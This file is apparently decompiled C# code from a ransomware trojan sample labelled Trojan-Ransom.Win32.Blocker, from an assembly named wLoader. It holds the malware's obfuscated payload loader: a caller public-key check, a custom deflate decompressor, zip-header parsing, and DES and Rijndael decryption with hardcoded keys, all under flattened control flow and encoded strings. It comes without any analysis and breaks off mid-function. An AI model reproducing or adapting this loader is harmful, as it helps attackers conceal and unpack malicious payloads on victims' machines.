// Decompiled with JetBrains decompiler
// Type: ?24?
// Assembly: wLoader, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 89823795-D5B3-4CC9-949D-6649607AF138
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.Blocker.bndr-d893b556a8d0493f8839c80049bd91fd0bdbcb93646edcc7b2f28d89325ced11.exe

using System;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;

public static class \u003F24\u003F
{
  public static string \u003F88\u003F;

  private static bool \u003F0\u003F(Assembly _param0, Assembly _param1)
  {
    byte[] publicKey1 = _param0.GetName().GetPublicKey();
    int num = 0;
    byte[] publicKey2;
    int index;
    while (true)
    {
      switch (num)
      {
        case 0:
          publicKey2 = _param1.GetName().GetPublicKey();
          num = 1;
          continue;
        case 1:
          if (publicKey2 == null == (publicKey1 == null))
          {
            if (publicKey2 != null)
            {
              index = 0;
              num = 2;
              continue;
            }
            goto label_8;
          }
          else
            goto label_9;
        default:
          goto label_7;
      }
    }
label_7:
    for (; index < publicKey2.Length; ++index)
    {
      if ((int) publicKey2[index] == (int) publicKey1[index])
        continue;
      return false;
    }
label_8:
    return true;
label_9:
    return false;
  }

  private static ICryptoTransform \u003F0\u003F(
    byte[] _param0,
    byte[] _param1,
    bool _param2)
  {
    using (SymmetricAlgorithm symmetricAlgorithm = (SymmetricAlgorithm) new RijndaelManaged())
      return _param2 ? symmetricAlgorithm.CreateDecryptor(_param0, _param1) : symmetricAlgorithm.CreateEncryptor(_param0, _param1);
  }

  private static ICryptoTransform \u003F5\u003F(
    byte[] _param0,
    byte[] _param1,
    bool _param2)
  {
    using (DESCryptoServiceProvider cryptoServiceProvider = new DESCryptoServiceProvider())
      return _param2 ? cryptoServiceProvider.CreateDecryptor(_param0, _param1) : cryptoServiceProvider.CreateEncryptor(_param0, _param1);
  }

  public static byte[] \u003F54\u003F(byte[] _param0)
  {
    Assembly callingAssembly = Assembly.GetCallingAssembly();
    int num1 = 0;
    byte[] numArray1;
    while (true)
    {
      Assembly executingAssembly;
      \u003F24\u003F.\u003F18\u003F obj1;
      int num2;
      short num3;
      int num4;
      int num5;
      int length1;
      int count1;
      int count2;
      byte[] buffer1;
      byte[] buffer2;
      byte[] buffer3;
      \u003F24\u003F.\u003F0\u003F obj2;
      int num6;
      int length2;
      int num7;
      int length3;
      int num8;
      byte[] buffer4;
      \u003F24\u003F.\u003F0\u003F obj3;
      byte[] numArray2;
      byte[] numArray3;
      byte[] numArray4;
      byte[] numArray5;
      switch (num1)
      {
        case 0:
          executingAssembly = Assembly.GetExecutingAssembly();
          num1 = 1;
          continue;
        case 1:
          if ((object) callingAssembly == (object) executingAssembly || \u003F24\u003F.\u003F0\u003F(executingAssembly, callingAssembly))
          {
            obj1 = new \u003F24\u003F.\u003F18\u003F(_param0);
            num1 = 2;
            continue;
          }
          goto label_4;
        case 2:
          numArray1 = new byte[0];
          num1 = 3;
          continue;
        case 3:
          num2 = obj1.\u003F5\u003F();
          num1 = 4;
          continue;
        case 4:
          if (num2 == 67324752)
          {
            num3 = (short) obj1.\u003F0\u003F();
            num1 = 5;
            continue;
          }
          num6 = num2 >> 24;
          num1 = 22;
          continue;
        case 5:
          num4 = obj1.\u003F0\u003F();
          num1 = 6;
          continue;
        case 6:
          num5 = obj1.\u003F0\u003F();
          num1 = 7;
          continue;
        case 7:
          if (num2 == 67324752 && num3 == (short) 20 && num4 == 0 && num5 == 8)
          {
            obj1.\u003F5\u003F();
            num1 = 8;
            continue;
          }
          goto label_13;
        case 8:
          obj1.\u003F5\u003F();
          num1 = 9;
          continue;
        case 9:
          obj1.\u003F5\u003F();
          num1 = 10;
          continue;
        case 10:
          length1 = obj1.\u003F5\u003F();
          num1 = 11;
          continue;
        case 11:
          count1 = obj1.\u003F0\u003F();
          num1 = 12;
          continue;
        case 12:
          count2 = obj1.\u003F0\u003F();
          num1 = 13;
          continue;
        case 13:
          if (count1 > 0)
          {
            buffer1 = new byte[count1];
            num1 = 14;
            continue;
          }
          break;
        case 14:
          obj1.Read(buffer1, 0, count1);
          break;
        case 15:
          obj1.Read(buffer2, 0, count2);
          goto label_26;
        case 16:
          obj1.Read(buffer3, 0, buffer3.Length);
          num1 = 17;
          continue;
        case 17:
          obj2 = new \u003F24\u003F.\u003F0\u003F(buffer3);
          num1 = 18;
          continue;
        case 18:
          numArray1 = new byte[length1];
          num1 = 19;
          continue;
        case 19:
          obj2.\u003F0\u003F(numArray1, 0, numArray1.Length);
          num1 = 20;
          continue;
        case 20:
          buffer3 = (byte[]) null;
          num1 = 21;
          continue;
        case 21:
label_64:
          obj1.Close();
          num1 = 37;
          continue;
        case 22:
          num2 -= num6 << 24;
          num1 = 23;
          continue;
        case 23:
          if (num2 == 8223355)
          {
            if (num6 == 1)
            {
              length2 = obj1.\u003F5\u003F();
              num1 = 24;
              continue;
            }
            goto label_47;
          }
          else
            goto label_63;
        case 24:
          numArray1 = new byte[length2];
          num1 = 25;
          continue;
        case 25:
          num7 = 0;
          num1 = 26;
          continue;
        case 26:
          if (num7 < length2)
          {
            length3 = obj1.\u003F5\u003F();
            num1 = 27;
            continue;
          }
          goto label_47;
        case 27:
          num8 = obj1.\u003F5\u003F();
          num1 = 28;
          continue;
        case 28:
          buffer4 = new byte[length3];
          num1 = 29;
          continue;
        case 29:
          obj1.Read(buffer4, 0, buffer4.Length);
          num1 = 30;
          continue;
        case 30:
          obj3 = new \u003F24\u003F.\u003F0\u003F(buffer4);
          num1 = 31;
          continue;
        case 31:
          obj3.\u003F0\u003F(numArray1, num7, num8);
          num1 = 32;
          continue;
        case 32:
          num7 += num8;
          goto case 26;
        case 33:
          numArray3 = new byte[8]
          {
            (byte) 142,
            (byte) 70,
            (byte) 24,
            (byte) 210,
            (byte) 166,
            (byte) 156,
            (byte) 182,
            (byte) 203
          };
          num1 = 34;
          continue;
        case 34:
          using (ICryptoTransform cryptoTransform = \u003F24\u003F.\u003F5\u003F(numArray2, numArray3, true))
          {
            numArray1 = \u003F24\u003F.\u003F54\u003F(cryptoTransform.TransformFinalBlock(_param0, 4, _param0.Length - 4));
            goto label_55;
          }
        case 35:
          numArray5 = new byte[16]
          {
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2
          };
          num1 = 36;
          continue;
        case 36:
          using (ICryptoTransform cryptoTransform = \u003F24\u003F.\u003F0\u003F(numArray4, numArray5, true))
          {
            numArray1 = \u003F24\u003F.\u003F54\u003F(cryptoTransform.TransformFinalBlock(_param0, 4, _param0.Length - 4));
            goto case 21;
          }
        case 37:
          obj1 = (\u003F24\u003F.\u003F18\u003F) null;
          num1 = 38;
          continue;
        default:
          goto label_66;
      }
      if (count2 > 0)
      {
        buffer2 = new byte[count2];
        num1 = 15;
        continue;
      }
label_26:
      buffer3 = new byte[obj1.Length - obj1.Position];
      num1 = 16;
      continue;
label_47:
      if (num6 == 2)
      {
        numArray2 = new byte[8]
        {
          (byte) 227,
          (byte) 70,
          (byte) 79,
          (byte) 35,
          (byte) 50,
          (byte) 250,
          (byte) 96,
          (byte) 44
        };
        num1 = 33;
        continue;
      }
label_55:
      if (num6 == 3)
      {
        numArray4 = new byte[16]
        {
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1
        };
        num1 = 35;
      }
      else
        goto label_64;
    }
label_4:
    return (byte[]) null;
label_13:
    throw new FormatException(\u003F94\u003F.\u003F95\u003F("AŧɻͽѵԱ٘ݪ\u086F३੩\u0B79ప\u0D5A\u0E61འၨᅤተ\u1376ᑰᕤ"));
label_63:
    throw new FormatException(\u003F94\u003F.\u003F95\u003F("[ţɧͥѥվ٦ܧࡎॠ\u0A65୧౧\u0D73"));
label_66:
    return numArray1;
  }

  public static byte[] \u003F55\u003F(byte[] _param0) => \u003F24\u003F.\u003F0\u003F(_param0, 1, (byte[]) null, (byte[]) null);

  public static byte[] \u003F56\u003F(byte[] _param0, byte[] _param1, byte[] _param2) => \u003F24\u003F.\u003F0\u003F(_param0, 2, _param1, _param2);

  public static byte[] \u003F57\u003F(byte[] _param0, byte[] _param1, byte[] _param2) => \u003F24\u003F.\u003F0\u003F(_param0, 3, _param1, _param2);

  private static byte[] \u003F0\u003F(byte[] _param0, int _param1, byte[] _param2, byte[] _param3)
  {
    byte[] array;
    try
    {
      \u003F24\u003F.\u003F18\u003F obj1 = new \u003F24\u003F.\u003F18\u003F();
      int num1 = 0;
      while (true)
      {
        \u003F24\u003F.\u003F13\u003F obj2;
        DateTime now;
        long num2;
        uint[] numArray;
        uint maxValue;
        uint num3;
        int num4;
        int length;
        long position1;
        byte[] bytes;
        byte[] buffer1;
        int count1;
        byte[] buffer2;
        int count2;
        long num5;
        int srcOffset;
        byte[] dst;
        long position2;
        \u003F24\u003F.\u003F13\u003F obj3;
        byte[] buffer3;
        int count3;
        byte[] buffer4;
        int count4;
        long position3;
        byte[] inputBuffer1;
        byte[] inputBuffer2;
        switch (num1)
        {
          case 0:
            switch (_param1)
            {
              case 0:
                obj2 = new \u003F24\u003F.\u003F13\u003F();
                num1 = 1;
                continue;
              case 1:
                obj1.\u003F5\u003F(25000571);
                num1 = 57;
                continue;
              case 2:
                obj1.\u003F5\u003F(41777787);
                num1 = 76;
                continue;
              case 3:
                obj1.\u003F5\u003F(58555003);
                num1 = 78;
                continue;
              default:
                goto label_108;
            }
          case 1:
            now = DateTime.Now;
            num1 = 2;
            continue;
          case 2:
            num2 = (long) ((uint) ((now.Year - 1980 & (int) sbyte.MaxValue) << 25 | now.Month << 21 | now.Day << 16 | now.Hour << 11 | now.Minute << 5) | (uint) now.Second >> 1);
            num1 = 3;
            continue;
          case 3:
            numArray = new uint[256]
            {
              0U,
              1996959894U,
              3993919788U,
              2567524794U,
              124634137U,
              1886057615U,
              3915621685U,
              2657392035U,
              249268274U,
              2044508324U,
              3772115230U,
              2547177864U,
              162941995U,
              2125561021U,
              3887607047U,
              2428444049U,
              498536548U,
              1789927666U,
              4089016648U,
              2227061214U,
              450548861U,
              1843258603U,
              4107580753U,
              2211677639U,
              325883990U,
              1684777152U,
              4251122042U,
              2321926636U,
              335633487U,
              1661365465U,
              4195302755U,
              2366115317U,
              997073096U,
              1281953886U,
              3579855332U,
              2724688242U,
              1006888145U,
              1258607687U,
              3524101629U,
              2768942443U,
              901097722U,
              1119000684U,
              3686517206U,
              2898065728U,
              853044451U,
              1172266101U,
              3705015759U,
              2882616665U,
              651767980U,
              1373503546U,
              3369554304U,
              3218104598U,
              565507253U,
              1454621731U,
              3485111705U,
              3099436303U,
              671266974U,
              1594198024U,
              3322730930U,
              2970347812U,
              795835527U,
              1483230225U,
              3244367275U,
              3060149565U,
              1994146192U,
              31158534U,
              2563907772U,
              4023717930U,
              1907459465U,
              112637215U,
              2680153253U,
              3904427059U,
              2013776290U,
              251722036U,
              2517215374U,
              3775830040U,
              2137656763U,
              141376813U,
              2439277719U,
              3865271297U,
              1802195444U,
              476864866U,
              2238001368U,
              4066508878U,
              1812370925U,
              453092731U,
              2181625025U,
              4111451223U,
              1706088902U,
              314042704U,
              2344532202U,
              4240017532U,
              1658658271U,
              366619977U,
              2362670323U,
              4224994405U,
              1303535960U,
              984961486U,
              2747007092U,
              3569037538U,
              1256170817U,
              1037604311U,
              2765210733U,
              3554079995U,
              1131014506U,
              879679996U,
              2909243462U,
              3663771856U,
              1141124467U,
              855842277U,
              2852801631U,
              3708648649U,
              1342533948U,
              654459306U,
              3188396048U,
              3373015174U,
              1466479909U,
              544179635U,
              3110523913U,
              3462522015U,
              1591671054U,
              702138776U,
              2966460450U,
              3352799412U,
              1504918807U,
              783551873U,
              3082640443U,
              3233442989U,
              3988292384U,
              2596254646U,
              62317068U,
              1957810842U,
              3939845945U,
              2647816111U,
              81470997U,
              1943803523U,
              3814918930U,
              2489596804U,
              225274430U,
              2053790376U,
              3826175755U,
              2466906013U,
              167816743U,
              2097651377U,
              4027552580U,
              2265490386U,
              503444072U,
              1762050814U,
              4150417245U,
              2154129355U,
              426522225U,
              1852507879U,
              4275313526U,
              2312317920U,
              282753626U,
              1742555852U,
              4189708143U,
              2394877945U,
              397917763U,
              1622183637U,
              3604390888U,
              2714866558U,
              953729732U,
              1340076626U,
              3518719985U,
              2797360999U,
              1068828381U,
              1219638859U,
              3624741850U,
              2936675148U,
              906185462U,
              1090812512U,
              3747672003U,
              2825379669U,
              829329135U,
              1181335161U,
              3412177804U,
              3160834842U,
              628085408U,
              1382605366U,
              3423369109U,
              3138078467U,
              570562233U,
              1426400815U,
              3317316542U,
              2998733608U,
              733239954U,
              1555261956U,
              3268935591U,
              3050360625U,
              752459403U,
              1541320221U,
              2607071920U,
              3965973030U,
              1969922972U,
              40735498U,
              2617837225U,
              3943577151U,
              1913087877U,
              83908371U,
              2512341634U,
              3803740692U,
              2075208622U,
              213261112U,
              2463272603U,
              3855990285U,
              2094854071U,
              198958881U,
              2262029012U,
              4057260610U,
              1759359992U,
              534414190U,
              2176718541U,
              4139329115U,
              1873836001U,
              414664567U,
              2282248934U,
              4279200368U,
              1711684554U,
              285281116U,
              2405801727U,
              4167216745U,
              1634467795U,
              376229701U,
              2685067896U,
              3608007406U,
              1308918612U,
              956543938U,
              2808555105U,
              3495958263U,
              1231636301U,
              1047427035U,
              2932959818U,
              3654703836U,
              1088359270U,
              936918000U,
              2847714899U,
              3736837829U,
              1202900863U,
              817233897U,
              3183342108U,
              3401237130U,
              1404277552U,
              615818150U,
              3134207493U,
              3453421203U,
              1423857449U,
              601450431U,
              3009837614U,
              3294710456U,
              1567103746U,
              711928724U,
              3020668471U,
              3272380065U,
              1510334235U,
              755167117U
            };
            num1 = 4;
            continue;
          case 4:
            maxValue = uint.MaxValue;
            num1 = 5;
            continue;
          case 5:
            num3 = maxValue;
            num1 = 6;
            continue;
          case 6:
            num4 = 0;
            num1 = 7;
            continue;
          case 7:
            length = _param0.Length;
            num1 = 8;
            continue;
          case 8:
            while (--length >= 0)
              num3 = numArray[(IntPtr) (uint) (((int) num3 ^ (int) _param0[num4++]) & (int) byte.MaxValue)] ^ num3 >> 8;
            num3 ^= maxValue;
            num1 = 9;
            continue;
          case 9:
            obj1.\u003F5\u003F(67324752);
            num1 = 10;
            continue;
          case 10:
            obj1.\u003F0\u003F(20);
            num1 = 11;
            continue;
          case 11:
            obj1.\u003F0\u003F(0);
            num1 = 12;
            continue;
          case 12:
            obj1.\u003F0\u003F(8);
            num1 = 13;
            continue;
          case 13:
            obj1.\u003F5\u003F((int) num2);
            num1 = 14;
            continue;
          case 14:
            obj1.\u003F5\u003F((int) num3);
            num1 = 15;
            continue;
          case 15:
            position1 = obj1.Position;
            num1 = 16;
            continue;
          case 16:
            obj1.\u003F5\u003F(0);
            num1 = 17;
            continue;
          case 17:
            obj1.\u003F5\u003F(_param0.Length);
            num1 = 18;
            continue;
          case 18:
            bytes = Encoding.UTF8.GetBytes(\u003F94\u003F.\u003F95\u003F("}šɥͷѣռ"));
            num1 = 19;
            continue;
          case 19:
            obj1.\u003F0\u003F(bytes.Length);
            num1 = 20;
            continue;
          case 20:
            obj1.\u003F0\u003F(0);
            num1 = 21;
            continue;
          case 21:
            obj1.Write(bytes, 0, bytes.Length);
            num1 = 22;
            continue;
          case 22:
            obj2.\u003F0\u003F(_param0);
            num1 = 23;
            continue;
          case 23:
            if (!obj2.\u003F5\u003F())
            {
              buffer1 = new byte[512];
              num1 = 24;
              continue;
            }
            break;
          case 24:
            count1 = obj2.\u003F0\u003F(buffer1);
            num1 = 25;
            continue;
          case 25:
            if (count1 > 0)
            {
              obj1.Write(buffer1, 0, count1);
              goto case 23;
            }
            else
              break;
          case 26:
            if (!obj2.\u003F0\u003F())
            {
              buffer2 = new byte[512];
              num1 = 27;
              continue;
            }
            goto label_39;
          case 27:
            count2 = obj2.\u003F0\u003F(buffer2);
            num1 = 28;
            continue;
          case 28:
            if (count2 > 0)
            {
              obj1.Write(buffer2, 0, count2);
              goto case 26;
            }
            else
              goto label_39;
          case 29:
            obj1.\u003F5\u003F(33639248);
            num1 = 30;
            continue;
          case 30:
            obj1.\u003F0\u003F(20);
            num1 = 31;
            continue;
          case 31:
            obj1.\u003F0\u003F(20);
            num1 = 32;
            continue;
          case 32:
            obj1.\u003F0\u003F(0);
            num1 = 33;
            continue;
          case 33:
            obj1.\u003F0\u003F(8);
            num1 = 34;
            continue;
          case 34:
            obj1.\u003F5\u003F((int) num2);
            num1 = 35;
            continue;
          case 35:
            obj1.\u003F5\u003F((int) num3);
            num1 = 36;
            continue;
          case 36:
            obj1.\u003F5\u003F((int) num5);
            num1 = 37;
            continue;
          case 37:
            obj1.\u003F5\u003F(_param0.Length);
            num1 = 38;
            continue;
          case 38:
            obj1.\u003F0\u003F(bytes.Length);
            num1 = 39;
            continue;
          case 39:
            obj1.\u003F0\u003F(0);
            num1 = 40;
            continue;
          case 40:
            obj1.\u003F0\u003F(0);
            num1 = 41;
            continue;
          case 41:
            obj1.\u003F0\u003F(0);
            num1 = 42;
            continue;
          case 42:
            obj1.\u003F0\u003F(0);
            num1 = 43;
            continue;
          case 43:
            obj1.\u003F5\u003F(0);
            num1 = 44;
            continue;
          case 44:
            obj1.\u003F5\u003F(0);
            num1 = 45;
            continue;
          case 45:
            obj1.Write(bytes, 0, bytes.Length);
            num1 = 46;
            continue;
          case 46:
            obj1.\u003F5\u003F(101010256);
            num1 = 47;
            continue;
          case 47:
            obj1.\u003F0\u003F(0);
            num1 = 48;
            continue;
          case 48:
            obj1.\u003F0\u003F(0);
            num1 = 49;
            continue;
          case 49:
            obj1.\u003F0\u003F(1);
            num1 = 50;
            continue;
          case 50:
            obj1.\u003F0\u003F(1);
            num1 = 51;
            continue;
          case 51:
            obj1.\u003F5\u003F(46 + bytes.Length);
            num1 = 52;
            continue;
          case 52:
            obj1.\u003F5\u003F((int) ((long) (30 + bytes.Length) + num5));
            num1 = 53;
            continue;
          case 53:
            obj1.\u003F0\u003F(0);
            num1 = 54;
            continue;
          case 54:
            obj1.Seek(position1, SeekOrigin.Begin);
            num1 = 55;
            continue;
          case 55:
            obj1.\u003F5\u003F((int) num5);
            num1 = 56;
            continue;
          case 56:
label_108:
            obj1.Flush();
            num1 = 80;
            continue;
          case 57:
            obj1.\u003F5\u003F(_param0.Length);
            num1 = 58;
            continue;
          case 58:
            srcOffset = 0;
            num1 = 59;
            continue;
          case 59:
            if (srcOffset < _param0.Length)
            {
              dst = new byte[Math.Min(2097151, _param0.Length - srcOffset)];
              num1 = 60;
              continue;
            }
            goto case 56;
          case 60:
            Buffer.BlockCopy((Array) _param0, srcOffset, (Array) dst, 0, dst.Length);
            num1 = 61;
            continue;
          case 61:
            position2 = obj1.Position;
            num1 = 62;
            continue;
          case 62:
            obj1.\u003F5\u003F(0);
            num1 = 63;
            continue;
          case 63:
            obj1.\u003F5\u003F(dst.Length);
            num1 = 64;
            continue;
          case 64:
            obj3 = new \u003F24\u003F.\u003F13\u003F();
            num1 = 65;
            continue;
          case 65:
            obj3.\u003F0\u003F(dst);
            num1 = 66;
            continue;
          case 66:
            if (!obj3.\u003F5\u003F())
            {
              buffer3 = new byte[512];
              num1 = 67;
              continue;
            }
            goto label_82;
          case 67:
            count3 = obj3.\u003F0\u003F(buffer3);
            num1 = 68;
            continue;
          case 68:
            if (count3 > 0)
            {
              obj1.Write(buffer3, 0, count3);
              goto case 66;
            }
            else
              goto label_82;
          case 69:
            if (!obj3.\u003F0\u003F())
            {
              buffer4 = new byte[512];
              num1 = 70;
              continue;
            }
            goto label_88;
          case 70:
            count4 = obj3.\u003F0\u003F(buffer4);
            num1 = 71;
            continue;
          case 71:
            if (count4 > 0)
            {
              obj1.Write(buffer4, 0, count4);
              goto case 69;
            }
            else
              goto label_88;
          case 72:
            obj1.Position = position2;
            num1 = 73;
            continue;
          case 73:
            obj1.\u003F5\u003F((int) obj3.\u003F0\u003F());
            num1 = 74;
            continue;
          case 74:
            obj1.Position = position3;
            num1 = 75;
            continue;
          case 75:
            srcOffset += dst.Length;
            goto case 59;
          case 76:
            inputBuffer1 = \u003F24\u003F.\u003F0\u003F(_param0, 1, (byte[]) null, (byte[]) null);
            num1 = 77;
            continue;
          case 77:
            using (ICryptoTransform cryptoTransform = \u003F24\u003F.\u003F5\u003F(_param2, _param3, false))
            {
              byte[] buffer5 = cryptoTransform.TransformFinalBlock(inputBuffer1, 0, inputBuffer1.Length);
              obj1.Write(buffer5, 0, buffer5.Length);
              goto case 56;
            }
          case 78:
            inputBuffer2 = \u003F24\u003F.\u003F0\u003F(_param0, 1, (byte[]) null, (byte[]) null);
            num1 = 79;
            continue;
          case 79:
            using (ICryptoTransform cryptoTransform = \u003F24\u003F.\u003F0\u003F(_param2, _param3, false))
            {
              byte[] buffer6 = cryptoTransform.TransformFinalBlock(inputBuffer2, 0, inputBuffer2.Length);
              obj1.Write(buffer6, 0, buffer6.Length);
              goto case 56;
            }
          case 80:
            obj1.Close();
            num1 = 81;
            continue;
          case 81:
            array = obj1.ToArray();
            num1 = 82;
            continue;
          default:
            goto label_112;
        }
        obj2.\u003F0\u003F();
        num1 = 26;
        continue;
label_39:
        num5 = obj2.\u003F0\u003F();
        num1 = 29;
        continue;
label_82:
        obj3.\u003F0\u003F();
        num1 = 69;
        continue;
label_88:
        position3 = obj1.Position;
        num1 = 72;
      }
    }
    catch (Exception ex)
    {
      \u003F24\u003F.\u003F88\u003F = \u003F94\u003F.\u003F95\u003F("Ośɚ̧дԵشܰ࠸ड") + ex.Message;
      throw;
    }
label_112:
    return array;
  }

  internal class \u003F0\u003F
  {
    private static readonly int[] \u003F0\u003F = new int[29]
    {
      3,
      4,
      5,
      6,
      7,
      8,
      9,
      10,
      11,
      13,
      15,
      17,
      19,
      23,
      27,
      31,
      35,
      43,
      51,
      59,
      67,
      83,
      99,
      115,
      131,
      163,
      195,
      227,
      258
    };
    private static readonly int[] \u003F5\u003F = new int[29]
    {
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1,
      1,
      1,
      1,
      2,
      2,
      2,
      2,
      3,
      3,
      3,
      3,
      4,
      4,
      4,
      4,
      5,
      5,
      5,
      5,
      0
    };
    private static readonly int[] \u003F9\u003F = new int[30]
    {
      1,
      2,
      3,
      4,
      5,
      7,
      9,
      13,
      17,
      25,
      33,
      49,
      65,
      97,
      129,
      193,
      257,
      385,
      513,
      769,
      1025,
      1537,
      2049,
      3073,
      4097,
      6145,
      8193,
      12289,
      16385,
      24577
    };
    private static readonly int[] \u003F11\u003F = new int[30]
    {
      0,
      0,
      0,
      0,
      1,
      1,
      2,
      2,
      3,
      3,
      4,
      4,
      5,
      5,
      6,
      6,
      7,
      7,
      8,
      8,
      9,
      9,
      10,
      10,
      11,
      11,
      12,
      12,
      13,
      13
    };
    private int \u003F0\u003F;
    private int \u003F5\u003F;
    private int \u003F9\u003F;
    private int \u003F11\u003F;
    private int \u003F12\u003F;
    private bool \u003F0\u003F;
    private \u003F24\u003F.\u003F5\u003F \u003F0\u003F;
    private \u003F24\u003F.\u003F9\u003F \u003F0\u003F;
    private \u003F24\u003F.\u003F12\u003F \u003F0\u003F;
    private \u003F24\u003F.\u003F11\u003F \u003F0\u003F;
    private \u003F24\u003F.\u003F11\u003F \u003F5\u003F;

    public \u003F0\u003F(byte[] _param1)
    {
      this.\u003F0\u003F = new \u003F24\u003F.\u003F5\u003F();
      this.\u003F0\u003F = new \u003F24\u003F.\u003F9\u003F();
      this.\u003F0\u003F = 2;
      this.\u003F0\u003F.\u003F0\u003F(_param1, 0, _param1.Length);
    }

    private bool \u003F0\u003F()
    {
      int num1 = this.\u003F0\u003F.\u003F0\u003F();
      int num2 = 0;
      while (true)
      {
        int num3;
        int index;
        int num4;
        int num5;
        switch (num2)
        {
          case 0:
label_31:
            if (num1 >= 258)
            {
              num3 = this.\u003F0\u003F;
              num2 = 1;
              continue;
            }
            goto label_41;
          case 1:
            switch (num3)
            {
              case 7:
                break;
              case 8:
                goto label_13;
              case 9:
                goto label_19;
              case 10:
                goto label_23;
              default:
                goto label_31;
            }
            break;
          case 2:
            if (--num1 >= 258)
              break;
            goto label_32;
          case 3:
            this.\u003F0\u003F = (\u003F24\u003F.\u003F11\u003F) null;
            num2 = 4;
            continue;
          case 4:
            this.\u003F0\u003F = 2;
            num2 = 5;
            continue;
          case 5:
            goto label_10;
          case 6:
            this.\u003F5\u003F = \u003F24\u003F.\u003F0\u003F.\u003F5\u003F[index - 257];
            goto label_13;
          case 7:
            num4 = this.\u003F0\u003F.\u003F0\u003F(this.\u003F5\u003F);
            num2 = 8;
            continue;
          case 8:
            if (num4 >= 0)
            {
              this.\u003F0\u003F.\u003F0\u003F(this.\u003F5\u003F);
              num2 = 9;
              continue;
            }
            goto label_37;
          case 9:
            this.\u003F9\u003F += num4;
            goto label_18;
          case 10:
            if (index >= 0)
            {
              this.\u003F11\u003F = \u003F24\u003F.\u003F0\u003F.\u003F9\u003F[index];
              num2 = 11;
              continue;
            }
            goto label_38;
          case 11:
            this.\u003F5\u003F = \u003F24\u003F.\u003F0\u003F.\u003F11\u003F[index];
            goto label_23;
          case 12:
            num5 = this.\u003F0\u003F.\u003F0\u003F(this.\u003F5\u003F);
            num2 = 13;
            continue;
          case 13:
            if (num5 >= 0)
            {
              this.\u003F0\u003F.\u003F0\u003F(this.\u003F5\u003F);
              num2 = 14;
              continue;
            }
            goto label_40;
          case 14:
            this.\u003F11\u003F += num5;
            goto label_28;
          case 15:
            num1 -= this.\u003F9\u003F;
            num2 = 16;
            continue;
          default:
            this.\u003F0\u003F = 7;
            goto case 0;
        }
        if (((index = this.\u003F0\u003F.\u003F0\u003F(this.\u003F0\u003F)) & -256) == 0)
        {
          this.\u003F0\u003F.\u003F0\u003F(index);
          num2 = 2;
          continue;
        }
        if (index >= 257)
        {
          this.\u003F9\u003F = \u003F24\u003F.\u003F0\u003F.\u003F0\u003F[index - 257];
          num2 = 6;
          continue;
        }
        if (index >= 0)
        {
          this.\u003F5\u003F = (\u003F24\u003F.\u003F11\u003F) null;
          num2 = 3;
          continue;
        }
        goto label_35;
label_13:
        if (this.\u003F5\u003F > 0)
        {
          this.\u003F0\u003F = 8;
          num2 = 7;
          continue;
        }
label_18:
        this.\u003F0\u003F = 9;
label_19:
        index = this.\u003F5\u003F.\u003F0\u003F(this.\u003F0\u003F);
        num2 = 10;
        continue;
label_23:
        if (this.\u003F5\u003F > 0)
        {
          this.\u003F0\u003F = 10;
          num2 = 12;
          continue;
        }
label_28:
        this.\u003F0\u003F.\u003F0\u003F(this.\u003F9\u003F, this.\u003F11\u003F);
        num2 = 15;
      }
label_10:
      return true;
label_32:
      return true;
label_35:
      return false;
label_37:
      return false;
label_38:
      return false;
label_40:
      return false;
label_41:
      return true;
    }

    private bool \u003F5\u003F()
    {
      int num1 = this.\u003F0\u003F;
      int num2 = 0;
      while (true)
      {
        int num3;
        int num4;
        int num5;
        int num6;
        int num7;
        switch (num2)
        {
          case 0:
            switch (num1)
            {
              case 2:
                if (!this.\u003F0\u003F)
                {
                  num3 = this.\u003F0\u003F.\u003F0\u003F(3);
                  num2 = 2;
                  continue;
                }
                this.\u003F0\u003F = 12;
                num2 = 1;
                continue;
              case 3:
                this.\u003F12\u003F = num5 = this.\u003F0\u003F.\u003F0\u003F(16);
                num2 = 11;
                continue;
              case 4:
                break;
              case 5:
                goto label_27;
              case 6:
                if (this.\u003F0\u003F.\u003F0\u003F(this.\u003F0\u003F))
                {
                  this.\u003F0\u003F = this.\u003F0\u003F.\u003F0\u003F();
                  num2 = 18;
                  continue;
                }
                goto label_43;
              case 7:
              case 8:
              case 9:
              case 10:
                goto label_36;
              case 12:
                goto label_44;
              default:
                goto label_45;
            }
            break;
          case 1:
            goto label_4;
          case 2:
            if (num3 >= 0)
            {
              this.\u003F0\u003F.\u003F0\u003F(3);
              num2 = 3;
              continue;
            }
            goto label_38;
          case 3:
            if ((num3 & 1) != 0)
              goto label_39;
label_9:
            num4 = num3 >> 1;
            num2 = 4;
            continue;
label_39:
            this.\u003F0\u003F = true;
            goto label_9;
          case 4:
            switch (num4)
            {
              case 0:
                this.\u003F0\u003F.\u003F0\u003F();
                num2 = 5;
                continue;
              case 1:
                this.\u003F0\u003F = \u003F24\u003F.\u003F11\u003F.\u003F0\u003F;
                num2 = 7;
                continue;
              case 2:
                this.\u003F0\u003F = new \u003F24\u003F.\u003F12\u003F();
                num2 = 10;
                continue;
              default:
                goto label_18;
            }
          case 5:
            this.\u003F0\u003F = 3;
            num2 = 6;
            continue;
          case 6:
          case 9:
            goto label_18;
          case 7:
            this.\u003F5\u003F = \u003F24\u003F.\u003F11\u003F.\u003F5\u003F;
            num2 = 8;
            continue;
          case 8:
            this.\u003F0\u003F = 7;
            num2 = 9;
            continue;
          case 10:
            goto label_17;
          case 11:
            if (num5 >= 0)
            {
              this.\u003F0\u003F.\u003F0\u003F(16);
              num2 = 12;
              continue;
            }
            goto label_40;
          case 12:
            this.\u003F0\u003F = 4;
            break;
          case 13:
            if (num6 >= 0)
            {
              this.\u003F0\u003F.\u003F0\u003F(16);
              num2 = 14;
              continue;
            }
            goto label_41;
          case 14:
            this.\u003F0\u003F = 5;
            goto label_27;
          case 15:
            this.\u003F12\u003F -= num7;
            num2 = 16;
            continue;
          case 16:
